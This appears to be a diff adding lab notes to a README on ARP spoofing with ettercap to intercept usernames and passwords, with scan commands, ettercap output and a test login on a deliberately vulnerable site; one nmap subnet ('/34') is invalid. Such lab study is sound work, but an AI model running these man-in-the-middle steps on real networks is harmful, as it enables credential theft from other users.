@@ -28,5 +28,46 @@ https://user-images.githubusercontent.com/94558947/157905659-5f66594b-eb3f-45fd-
 - echo 1 > /proc/sys/net/ipv4/ip_forward
 - cat /proc/sys/net/ipv4/ip_forward
 
+https://securityboulevard.com/2019/10/what-is-dns-cache-poisoning/
+
+
+= Intercept Username/Password with ARP Spoofing
+
+- ifconfig
+- route -n
+- nmap -sP 192.168.163.0/34
+
+- Windows
+CMD - ifconfig
+
+. ettercap execute
+
+. Accept
+Starting Unified sniffing...
+
+. Stop
+Unified sniffing was stopped.
+
+. Hostlist
+Scanning the whole netmask for 255 hosts...
+4 hosts added to the hosts list...
+
+. Add Target
+Host 192.168.163.130 added to TARGET1
+Host 192.168.163.2 added to TARGET2
+
+. MITM menu - Start ARP poisoning
+ARP poisoning victims:
+ GROUP 1 : 192.168.163.130 00:0C:29:2A:FB:EF
+ GROUP 2 : 192.168.163.2 00:50:56:FD:0A:5B
+
+. Start sniffing
+Starting Unified sniffing
+
+. Windows
+Webpage - vulnweb.com
+testphp.vulnweb.com - singup - login
+
+
 
 
